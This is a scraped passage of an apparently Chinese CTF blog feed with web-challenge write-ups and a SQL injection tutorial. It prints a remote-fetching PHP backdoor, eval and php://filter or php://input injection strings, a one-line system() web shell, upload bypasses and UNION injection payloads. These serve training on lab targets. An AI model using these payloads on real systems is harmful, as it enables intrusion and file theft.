+----------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">// | PHP version 5                                                        |</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">// | Copyright (c) 1997-2004 The PHP Group                                |</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">// | This source file is subject to version 3.0 of the PHP license,       |</span></span><br><span class="line"><span class="comment">// | that is bundled with this package in the file LICENSE, and is        |</span></span><br><span class="line"><span class="comment">// | available through the world-wide-web at the following url:           |</span></span><br><span class="line"><span class="comment">// | http://www.php.net/license/3_0.txt.                                  |</span></span><br><span class="line"><span class="comment">// | If you did not receive a copy of the PHP license and are unable to   |</span></span><br><span class="line"><span class="comment">// | obtain it through the world-wide-web, please send a note to          |</span></span><br><span class="line"><span class="comment">// | license@php.net so we can mail you a copy immediately.               |</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">// | Authors: Original Author &lt;author@example.com&gt;                        |</span></span><br><span class="line"><span class="comment">// |          Your Name &lt;you@example.com&gt;                                 |</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// $Id:$</span></span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">isset</span>($_POST[<span class="string">'pass'</span>]) ? trim($_POST[<span class="string">'pass'</span>]) : <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> ($a == <span class="string">''</span>) &#123;</span><br><span class="line">    echologin();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    chkpass($a);</span><br><span class="line">    helloowner($a); <span class="comment">// 关键是这个函数</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">chkpass</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>], md5($a)) === <span class="keyword">false</span>) &#123;</span><br><span class="line">        echofail(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">helloowner</span><span class="params">($a)</span> </span>&#123; </span><br><span class="line">    $b = gencodeurl($a);</span><br><span class="line">    $c = file_get_contents($b); <span class="comment">//这里要求从某个链接的文件读取json字符串，包含f，d字段的json，而且f，d里必须是一段木马，木马格式见下</span></span><br><span class="line">    <span class="keyword">if</span> ($c == <span class="keyword">false</span>) &#123;</span><br><span class="line">        echofail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $d = @json_decode($c, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($d[<span class="string">'f'</span>])) &#123;</span><br><span class="line">        echofail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $d[<span class="string">'f'</span>]($d[<span class="string">'d'</span>]); <span class="comment">// 木马格式</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gencodeurl</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    $e = md5(date(<span class="string">"Y-m-d"</span>));</span><br><span class="line">    <span class="keyword">if</span> (strlen($a) &gt; <span class="number">40</span>) &#123;</span><br><span class="line">        $f = substr($a, <span class="number">30</span>, <span class="number">5</span>);</span><br><span class="line">        $g = substr($a, <span class="number">10</span>, <span class="number">10</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $f = <span class="string">'good'</span>;</span><br><span class="line">        $g = <span class="string">'web.com'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $b = <span class="string">'http://'</span> . $f . $g;</span><br><span class="line">    <span class="keyword">return</span> $b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echofail</span><span class="params">($h)</span> </span>&#123;</span><br><span class="line">    $i = <span class="string">'PGh0bWw+PGhlYWQ+PG1ldGEgY2hhcnNldD0idXRmLTgiLz48dGl0bGU+54ix44GE56qS5oGv44CB55ebPC90aXRsZT48L2hlYWQ+PGJvZHkgc3R5bGU9IndpZHRoOiAzMGVtO21hcmdpbjogMWVtIGF1dG87dGV4dC1hbGlnbjogY2VudGVyOyI+PHAgZXJyaWQ9IiVpZCUiPuKFoS3jgIDjgIDilbAg5b+r55yL44CB5pyJ54Gw5py644CB5Zyo5rK15aS05LiK54Gw5p2l54Gw5Y6755qE44CCPC9wPjxwIHN0eWxlPSJmb250LXNpemU6IDUwJTsiPjxhIGhyZWY9Imh0dHBzOi8vd3d3LmxvdmVzdG9wcGFpbi50a0BibG9nLnZ1bHNweS5jb20vIj7niLHjgYTnqpLmga/jgIHnl5s8L2E+IOS4k+eUqOWQjumXqDwvcD48L2JvZHk+PC9odG1sPg=='</span>;</span><br><span class="line">    <span class="keyword">echo</span> str_replace(<span class="string">'%id%'</span>, $h, base64_decode($i));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echologin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $j = <span class="string">'PGh0bWw+PGhlYWQ+PG1ldGEgY2hhcnNldD0idXRmLTgiLz48dGl0bGU+54ix44GE56qS5oGv44CB55ebPC90aXRsZT48L2hlYWQ+PGJvZHkgc3R5bGU9IndpZHRoOiAyMGVtO21hcmdpbjogMWVtIGF1dG87dGV4dC1hbGlnbjogY2VudGVyOyI+PGZvcm0gYWNpdG9uPSIiIG1ldGhvZD0iUE9TVCI+PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwYXNzIiBwbGFjZWhvbGRlcj0icGFzcyI+PGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0IiB2YWx1ZT0ic3VibWl0Ij48L2Zvcm0+PHAgc3R5bGU9ImZvbnQtc2l6ZTogNTAlOyI+PGEgaHJlZj0iaHR0cHM6Ly93d3cubG92ZXN0b3BwYWluLnRrQGJsb2cudnVsc3B5LmNvbS8iPueIseOBhOeqkuaBr+OAgeeXmzwvYT4g5LiT55So5ZCO6ZeoPC9wPjwvYm9keT48L2h0bWw+'</span>;</span><br><span class="line">    <span class="keyword">echo</span> base64_decode($j);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p></blockquote><p>url方式，超过40个字符长度才可以进入<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gencodeurl</span><span class="params">($a)</span> </span>&#123;<span class="comment">//url切分</span></span><br><span class="line">    $e = md5(date(<span class="string">"Y-m-d"</span>));</span><br><span class="line">    <span class="keyword">if</span> (strlen($a) &gt; <span class="number">40</span>) &#123;<span class="comment">//如果长度&gt;40,$f = a[30:35],$g = a[10:20]</span></span><br><span class="line">        $f = substr($a, <span class="number">30</span>, <span class="number">5</span>);</span><br><span class="line">        $g = substr($a, <span class="number">10</span>, <span class="number">10</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $f = <span class="string">'good'</span>;</span><br><span class="line">        $g = <span class="string">'web.com'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $b = <span class="string">'http://'</span> . $f . $g;</span><br><span class="line">    <span class="keyword">return</span> $b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 传入字符串示例： http://aaa.com/a.phpccccccccccflag0aaaaaaaaa</span></span><br></pre></td></tr></table></figure></p><p>下面是需要让 file_get_contents($b) 访问到木马json文件的内容是<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$url = <span class="keyword">array</span>( </span><br><span class="line">    <span class="string">"f"</span>=&gt;<span class="string">"system"</span>, </span><br><span class="line">    <span class="string">"d"</span>=&gt;<span class="string">"cat ../flag.php"</span> </span><br><span class="line">); </span><br><span class="line">$url = json_encode($url); </span><br><span class="line"><span class="keyword">echo</span> $url; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>构造成功之后是： </p><blockquote><p>{“f”:”system”,”d”:”cat ..\/flag.php”}</p></blockquote><h3 id="bugku-系列"><a href="#bugku-系列" class="headerlink" title="bugku 系列"></a>bugku 系列</h3><h4 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h4><blockquote><p><a href="http://123.206.87.240:8004/index1.php" target="_blank" rel="noopener">http://123.206.87.240:8004/index1.php</a></p></blockquote><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag1.php"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'args'</span>]))&#123;</span><br><span class="line">    $args = $_GET[<span class="string">'args'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/^\w+$/"</span>,$args))&#123; <span class="comment">//正则匹配=&gt; /^开始, \w表示任意一个单词字符，即[a-zA-Z0-9_] ,+将前面的字符匹配一次或多次，$/结尾</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"args error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">"var_dump($$args);"</span>); <span class="comment">// 执行命令代码</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ol><p>分析php的9大内置变量</p><blockquote><p>$_POST [用于接收post提交的数据]<br>$_GET [用于获取url地址栏的参数数据]<br>$_FILES [用于文件就收的处理img 最常见]<br>$_COOKIE [用于获取与setCookie()中的name 值]<br>$_SESSION [用于存储session的值或获取session中的值]<br>$_REQUEST [具有get,post的功能，但比较慢]<br>$SERVER[是预定义服务器变量的一种，所有SERVER[是预定义服务器变量的一种，所有_SERVER [是预定义服务器变量的一种，所有_SERVER开头的都<br>$GLOBALS [一个包含了所有全局变量的数组]<br>$_ENV [ 是一个包含服务器端环境变量的数组。它是PHP中一个超级全局变量，我们可以在PHP 程序的任何地方直接访问它]</p></blockquote><p>得出令  args=GLOBALS  获得flag</p><h4 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h4><p>套路比较多，内容丰富，值得记录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>; </span><br><span class="line">    $a = @$_REQUEST[<span class="string">'hello'</span>];  <span class="comment">// 获取hello参数</span></span><br><span class="line">    <span class="keyword">eval</span>( <span class="string">"var_dump($a);"</span>);  <span class="comment">// var_dump()输出文件信息，需要绕过</span></span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol><li><p>套路一 直接闭合var_dump </p><blockquote><p>hello=1);show_source(%27flag.php%27);var_dump(3<br><a href="http://123.206.87.240:8003/index.php?hello=1);print_r(file(&quot;./flag.php&quot;)" target="_blank" rel="noopener">http://123.206.87.240:8003/index.php?hello=1);print_r(file(&quot;./flag.php&quot;)</a></p></blockquote></li><li><p>套路二 利用伪协议<br>直接使用post来使用伪协议</p><blockquote><p><a href="http://120.24.86.145:8003/index.php?hello=1);include" target="_blank" rel="noopener">http://120.24.86.145:8003/index.php?hello=1);include</a> $_POST[‘f’];//<br>在POST区域：f=php://filter/convert.base64-encode/resource=flag.php</p></blockquote></li><li><p>套路三 直接来</p><blockquote><p>?hello=get_file_contents(‘flag.php’)<br>?hello=file(‘flag.php’)</p></blockquote></li></ol><p>总之是字符串拼接玩出了花·····emm</p><h4 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h4><ol><li>看到备份首先想到 .bak  文件</li><li>利用御剑工具扫描查看到 index.php ,猜测拿到index.php.bak</li><li>套路：<br>1.) 如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。<blockquote><p>QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a<br>2.) 利用==漏洞，数组无法被识别，都是null</p></blockquote></li><li>特色<br>$_SERVER[‘REQUEST_URI’]  用来获取url，可以当作get请求</li></ol><h4 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h4><p>这个故事告诉我们，这狗题目说快速，就说明手动是绝对不行了，需要走脚本了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">"http://120.24.86.145:8002/web6/"</span></span><br><span class="line">r=requests.session()</span><br><span class="line">headers=r.get(url).headers<span class="comment">#因为flag在消息头里</span></span><br><span class="line"> </span><br><span class="line">str=base64.b64decode(headers[<span class="string">'flag'</span>])</span><br><span class="line">str=str.decode()<span class="comment">#为了下一步用split不报错，b64decode后操作的对象是byte类型的字符串，而split函数要用str类型的</span></span><br><span class="line"> </span><br><span class="line">flag = base64.b64decode(str.split(<span class="string">':'</span>)[<span class="number">1</span>])<span class="comment">#获得flag:后的值</span></span><br><span class="line">data=&#123;<span class="string">'margin'</span>:flag&#125;</span><br><span class="line"><span class="keyword">print</span> (r.post(url,data).text)<span class="comment">#post方法传上去</span></span><br></pre></td></tr></table></figure></p><h4 id="cookie欺骗"><a href="#cookie欺骗" class="headerlink" title="cookie欺骗"></a>cookie欺骗</h4><p>靶机： <a href="http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=" target="_blank" rel="noopener">http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=</a></p><ol><li>铺面的字符串是无效的</li><li>发现在url中看到有base64编码的a2V5cy50eHQ= </li><li>访问后发现依然是无效的字符串</li><li>filenam顾名思义可以尝试伪协议，尝试无效</li><li>盲猜filename是可以读取文件，尝试filename赋值为 index.php </li><li>修改line的数据，发现可以读出一行的数据，写脚本读出index.php的完整代码</li><li><p>脚本： </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])?$_GET[<span class="string">'filename'</span>]:<span class="string">""</span>);</span><br><span class="line">$line=<span class="keyword">isset</span>($_GET[<span class="string">'line'</span>])?intval($_GET[<span class="string">'line'</span>]):<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>($file==<span class="string">''</span>) header(<span class="string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span>);</span><br><span class="line">$file_list = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'0'</span> =&gt;<span class="string">'keys.txt'</span>,</span><br><span class="line"><span class="string">'1'</span> =&gt;<span class="string">'index.php'</span>,</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'margin'</span>]) &amp;&amp; $_COOKIE[<span class="string">'margin'</span>]==<span class="string">'margin'</span>) &#123;</span><br><span class="line">$file_list[<span class="number">2</span>]=<span class="string">'keys.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(in_array($file, $file_list)) &#123;</span><br><span class="line">$fa = file($file);</span><br><span class="line"><span class="keyword">echo</span> $fa[$line];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>得出结论发现，cookie为margin=margin可以给文件读取的数组赋值给keys.php，则keys.php可能是最终结果隐藏的地方</p></li><li>在burpsuite中更改cookie<blockquote><p>Cookie: margin=margin </p></blockquote></li><li>keys.php进行base64编码后传入给filename,得出结果<h4 id="web8-姿势整合了"><a href="#web8-姿势整合了" class="headerlink" title="web8 姿势整合了"></a>web8 姿势整合了</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($ac))</span><br><span class="line">&#123;</span><br><span class="line">$f = trim(file_get_contents($fn));</span><br><span class="line"><span class="keyword">if</span> ($ac === $f)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;This is flag:"</span> .<span class="string">" $flag&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;sorry!&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ol><p>可以看到ac = f 就行了 </p><ol><li>套路1：<br>看题目说txt 盲猜 flag.txt 直接拿到</li><li>伪协议<br>ac = 5<br>fn = php://input<br>post数据 5<br>可以获得</li></ol></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt;&lt;br&gt;自己后来做过的各种乱七八糟的题目&lt;br&gt;&lt;/excerpt&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ctf 杂录</title>
    <link href="http://runindark.com/2019/10/21/CTF-%E6%9D%82%E8%AE%B0/"/>
    <id>http://runindark.com/2019/10/21/CTF-杂记/</id>
    <published>2019-10-21T02:49:23.977Z</published>
    <updated>2019-11-08T11:59:04.348Z</updated>
    
    <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>各种姿势<br><a id="more"></a></excerpt></p><the rest="" of="" contents="" |="" 余下全文=""><h3 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h3><ol><li>$_SERVER[‘QUERY_STRING’]会获取到所有的文件后面传递的所有参数</li><li>php自身在解析请求时，会把+和.解析成下划线</li><li>数组与数字比较，永远大于数字</li><li>字符a在和整形进行弱类型比较时，会被强制转换成整形，其值为0<h4 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h4></li></ol><blockquote><p>file:// — 访问本地文件系统<br>http:// — 访问 HTTP(s) 网址<br>ftp:// — 访问 FTP(s) URLs<br>php:// — 访问各个输入/输出流（I/O streams）<br>zlib:// — 压缩流<br>data:// — 数据（RFC 2397）<br>glob:// — 查找匹配的文件路径模式<br>phar:// — PHP 归档<br>ssh2:// — Secure Shell 2<br>rar:// — RAR<br>ogg:// — 音频流<br>expect:// — 处理交互式的流</p></blockquote><h5 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h5><ol><li>经常使用的伪协议，一般用于任意文件读取，有时也可以用于getshell.在双OFF的情况下也可以使用.</li><li>php://filter是一种元封装器，用于数据流打开时筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用。类似readfile()、file()、file_get_contents(),在数据流读取之前没有机会使用其他过滤器。</li><li>用于直接读取用户的根目录的东西<blockquote><p>url=php://filter/read=convert.base64-encode/resource=flag</p></blockquote><h5 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h5></li><li>php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。<blockquote><p>使用时令参数赋值 php://input<br>利用hackbar使用post 传递命令 &lt;?php system(‘ls’)?&gt;  （列举所有文件）</p></blockquote></li></ol><h3 id="服务器自身漏洞"><a href="#服务器自身漏洞" class="headerlink" title="服务器自身漏洞"></a>服务器自身漏洞</h3><h4 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h4><ol><li>上传点存在白名单验证，从返回包可以得知其是apache2.2.15，apache2.2.15版本具有文件解析漏洞，可以把test.php.png当作php文件来解析执行，apache高版本不存在此漏洞，这里我们可以使用apache2.2.15的解析漏洞来绕过白名单限制<blockquote><p>&lt;?php system($_POST[‘cmd’]); ?&gt;<br>之后再利用post 发送数据，  cmd = cat /flag  获取flag</p></blockquote></li></ol><h3 id="xss-漏洞"><a href="#xss-漏洞" class="headerlink" title="xss 漏洞"></a>xss 漏洞</h3><h4 id="xss介绍"><a href="#xss介绍" class="headerlink" title="xss介绍"></a>xss介绍</h4><p>是由于动态网页的Web应用对用户提交请求参数未做充分的检查过滤，允许用户在提交的数据中掺入HTML代码（最主要的是“&gt;”、“&lt;”），然后未加编码地输出到第三方用户的浏览器，这些攻击者恶意提交代码会被受害用户的浏览器解释执行</p><h3 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h3><p>到 文件里改就完事了  </p><blockquote><p> c:\windows\system32\drivers\etc\hosts<br>前面是ip 后面是域名</p></blockquote><h3 id="php九大内置变量"><a href="#php九大内置变量" class="headerlink" title="php九大内置变量"></a>php九大内置变量</h3><p>分析php的9大内置变量</p><blockquote><p>$_POST [用于接收post提交的数据]<br>$_GET [用于获取url地址栏的参数数据]<br>$_FILES [用于文件就收的处理img 最常见]<br>$_COOKIE [用于获取与setCookie()中的name 值]<br>$_SESSION [用于存储session的值或获取session中的值]<br>$_REQUEST [具有get,post的功能，但比较慢]<br>$SERVER[是预定义服务器变量的一种，所有SERVER[是预定义服务器变量的一种，所有_SERVER [是预定义服务器变量的一种，所有_SERVER开头的都<br>$GLOBALS [一个包含了所有全局变量的数组]<br>$_ENV [ 是一个包含服务器端环境变量的数组。它是PHP中一个超级全局变量，我们可以在PHP 程序的任何地方直接访问它]</p></blockquote><h3 id="http系列"><a href="#http系列" class="headerlink" title="http系列"></a>http系列</h3><h4 id="referer-你从哪里来"><a href="#referer-你从哪里来" class="headerlink" title="referer (你从哪里来)"></a>referer (你从哪里来)</h4><blockquote><p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，<br>告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。<br>简而言之，HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，<br>一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器藉此可以获得一些信息用于处理。<br>比如从我主页上链接到一个朋友那里，他的服务器就能够从HTTP Referer中统计出每天有多少用户点击我主页上的链接访问他的网站。</p></blockquote><h3 id="绕过问题"><a href="#绕过问题" class="headerlink" title="绕过问题"></a>绕过问题</h3><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><ol><li>随便把content-type的内容进行大小写更改<blockquote><p>Content-Type: mULtipart/form-data;  boundary=—————————4827543632391   #修改大小写绕过 </p></blockquote></li><li>然后黄爆爆破尾缀<blockquote><p>改成php+数字的格式，比如php1，php2啥的</p></blockquote></li><li>靶机<br><a href="http://123.206.87.240:8002/web9/" target="_blank" rel="noopener">http://123.206.87.240:8002/web9/</a></li></ol></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt;&lt;br&gt;各种姿势&lt;br&gt;&lt;/excerpt&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ctf攻防之sql注入</title>
    <link href="http://runindark.com/2019/10/15/CTF-SQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://runindark.com/2019/10/15/CTF-SQL注入/</id>
    <published>2019-10-15T03:38:49.374Z</published>
    <updated>2019-11-08T09:04:48.529Z</updated>
    
    <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>基础sql注入<br><a id="more"></a></excerpt></p><the rest="" of="" contents="" |="" 余下全文=""><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><h4 id="sql注入的基本原理"><a href="#sql注入的基本原理" class="headerlink" title="sql注入的基本原理"></a>sql注入的基本原理</h4><ol><li>sql注入的主要原因来自sql查询的字符串拼接，例如我们正常输入1，那么呈现</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'1'</span></span><br></pre></td></tr></table></figure><ol start="2"><li>但是如果进行心机输入 1’ ,那么将会变成 ==》</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'1''</span></span><br></pre></td></tr></table></figure><ol start="3"><li>继续下去，因为两个 ‘ 的原因，那么则会产生sql syntax error ,所以需要产生注释后面的内容，我们需要#，因此输入 1’#</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'1'</span><span class="comment">#' </span></span><br><span class="line"></span><br><span class="line">===============&gt; 明显一些</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'1'</span></span><br></pre></td></tr></table></figure><ol start="4"><li>注入分类<br>整形注入<blockquote><p>SELECT * FROM admin WHERE id = 1 and 1=1</p></blockquote></li></ol><p>字符型注入</p><blockquote><p>SELECT * FROM admin WHERE id = ‘1’ and 1=1#’</p></blockquote><p>搜索型注入</p><blockquote><p>SELECT * FROM admin WHERE id LIKE ‘%1%’ and ‘%’=’%’</p></blockquote><h4 id="sql注入常用基本操作————主要利用union-select联合查询继续获取信息"><a href="#sql注入常用基本操作————主要利用union-select联合查询继续获取信息" class="headerlink" title="sql注入常用基本操作————主要利用union select联合查询继续获取信息"></a>sql注入常用基本操作————主要利用union select联合查询继续获取信息</h4><ol><li>获取数据库的基础信息<blockquote><p>1’ union select database(),user()#<br>database()返回当前使用的数据库名称<br>user() 返回当前使用者的信息</p></blockquote></li><li>获取操作系统等功能<blockquote><p>1’ union select version(),@@version_compile_os#<br>version() 获取当前数据库版本<br>@@version_compile_os 获取当前操作系统@@version_compile_os 获取当前操作系统</p></blockquote></li><li>获取数据库的表名<blockquote><p>1’ union select table_names,table_schema from information_schema.tables where table_schema = ‘table name’ #<br>数据库拥有一个名为 tables 的数据表，该表包含两个字段 table_name 和 table_schema，分别记录 DBMS 中的存储的表名和表名所在的数据库<br>ps: 数据库会用一个information_schema.tables来记录表的信息</p></blockquote></li><li>获取数据库的列名<blockquote><p>1’ union select group_concat(column_name) from information_schema.columns where table_schema=database()</p></blockquote></li><li>内联注释绕过<blockquote><p>上述union select 可能会被拦截，因此使用注释绕过，用/<em>！XX </em>/ 包裹，来实现绕过<br>word=1%’ and 1=2 /<em>!union</em>/   /<em>!select</em>/ database(),user(),database() %23&amp;§number=5§<br>转自： <a 